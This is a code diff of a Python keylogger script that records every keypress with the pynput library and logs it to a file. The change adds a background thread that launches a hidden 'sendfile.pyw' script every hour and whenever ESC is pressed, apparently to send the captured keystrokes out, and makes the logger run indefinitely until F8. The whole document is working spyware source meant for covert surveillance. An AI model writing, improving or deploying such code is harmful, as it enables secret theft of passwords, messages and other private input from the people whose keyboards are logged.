@@ -1,5 +1,6 @@
-#Author: Threde
-#Github: https://github.com/thredeisacoder
+# Author: Threde
+# Github: https://github.com/thredeisacoder
+
 
 import os
 import logging
@@ -21,27 +22,31 @@ def on_press(key):
     except AttributeError:
         logging.info(str(key))
         if key == keyboard.Key.esc:
-            # Stop listener
+            # Run sendfile.pyw when ESC is pressed
+            send_file()
+        elif key == keyboard.Key.f8:
+            # Stop listener when F8 is pressed
             return False
 
-def stop_listener(listener):
-    time.sleep(4 * 3600)  # Sleep for 4 hours (4 hours * 3600 seconds/hour)
-    listener.stop()
+def send_file():
+    home_dir = os.path.expanduser("~")
+    sendfile_path = os.path.join(home_dir, "Downloads", "Telegram Desktop", "sendfile.pyw")
+    subprocess.run(["python", sendfile_path])
+
+def send_file_periodically():
+    while True:
+        time.sleep(3600)  # Sleep for 1 hour
+        send_file()
 
 def run_keylogger():
+    # Start the thread to send the file periodically
+    send_thread = threading.Thread(target=send_file_periodically)
+    send_thread.daemon = True
+    send_thread.start()
+    
     # Start listener
     with keyboard.Listener(on_press=on_press) as listener:
-        # Start a thread to stop the listener after 4 hours
-        stop_thread = threading.Thread(target=stop_listener, args=(listener,))
-        stop_thread.start()
         listener.join()
-
-    # Dynamically construct the path to sendfile.py
-    home_dir = os.path.expanduser("~")
-    sendfile_path = os.path.join(home_dir, "Downloads", "Telegram Desktop", "sendfile.py")
-
-    # Run sendfile.py after listener stopped
-    subprocess.run(["python", sendfile_path])
 
 if __name__ == "__main__":
     run_keylogger()
